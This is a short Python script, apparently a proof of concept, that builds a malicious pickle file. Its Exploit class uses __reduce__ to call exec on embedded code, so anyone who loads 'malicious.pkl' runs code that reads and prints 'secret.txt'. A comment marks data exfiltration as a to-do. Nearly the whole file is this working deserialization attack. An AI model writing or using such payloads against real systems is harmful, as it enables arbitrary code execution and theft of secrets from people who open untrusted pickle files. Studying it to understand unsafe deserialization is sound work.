import pickle

#todo: data exfiltration

#this garbage was me trying to find a better way to execute code
src = """
class dosomething:
    def __init__(self):
        print("i can do whatever i want here")
        print(open("secret.txt").read())

dosomething()

secret_data = open("secret.txt").read()
print(secret_data)
"""

class Exploit:
    def __reduce__(self):
        #data = open("secret.txt").read()
        return (exec, (src,))

if __name__ == "__main__":
    payload = pickle.dumps(Exploit())

    with open("malicious.pkl", "wb") as f:
        f.write(payload)

    print("Malicious pickle written to file.")